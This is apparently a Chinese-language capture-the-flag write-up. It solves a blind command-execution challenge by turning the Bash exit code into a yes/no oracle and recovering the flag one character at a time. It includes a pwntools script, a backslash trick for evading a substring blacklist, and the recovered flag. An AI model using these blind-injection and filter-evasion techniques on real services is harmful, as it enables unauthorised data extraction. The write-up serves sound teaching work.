# bird-box

## 题目简述

服务把每行输入交给 Bash 执行，但丢弃标准输出和错误输出，只根据退出状态返回 GOOD 或 BAD。它还按原始命令字符串做大小写敏感的子串黑名单，拦截 bash、sh、python、nc 等词。flag 固定在 /Flag。

这相当于一个只有一位结果的盲命令执行 oracle：无法直接打印文件，却可以让命令的真假反映到退出码中。

## 解题过程

grep 在找到匹配时返回 0，找不到时返回 1，因此可以逐字符确认 flag 前缀。应使用固定字符串模式，避免 flag 中的符号被当作正则表达式：

~~~bash
grep -qF -- candidate-prefix /Flag
~~~

源码的黑名单包含子串“sh”。官方 solver 把 shellmates 前缀原样放进命令，按当前源码会先命中黑名单并得到 NOOO。Bash 会在解析阶段去掉反斜杠，所以可以把前缀写成 s\hellmates：原始输入不含连续的“sh”，实际传给 grep 的参数仍是 shellmates。

~~~python
from pwn import remote
import string

io = remote(HOST, PORT)
flag = "shellmates{"
alphabet = string.ascii_letters + string.digits + "_-}"

while not flag.endswith("}"):
    for char in alphabet:
        candidate = flag + char
        shell_word = candidate.replace("sh", r"s\h", 1)
        command = f"grep -qF -- {shell_word} /Flag"
        io.sendlineafter(b"ZeroCool@mctf:~$ ", command.encode())
        result = io.recvline().strip()
        if result == b"GOOD":
            flag = candidate
            print(flag)
            break
    else:
        raise RuntimeError("alphabet does not cover next character")
~~~

逐字符恢复得到：

~~~text
shellmates{FiN3_I_WIlL_D0_I7_BLiNdLyy}
~~~

## 方法总结

没有回显并不等于没有信息泄露。只要服务暴露命令退出码、响应时间或错误类别，就可以构造布尔 oracle。面对字符串黑名单时，要分别考虑过滤阶段和 Shell 解析阶段：反斜杠、相邻引号或变量拼接可以让原始文本避开子串，同时在执行时重建同一个参数。固定字符串匹配比正则更稳，且字符集穷举必须设置失败分支，避免脚本静默死循环。
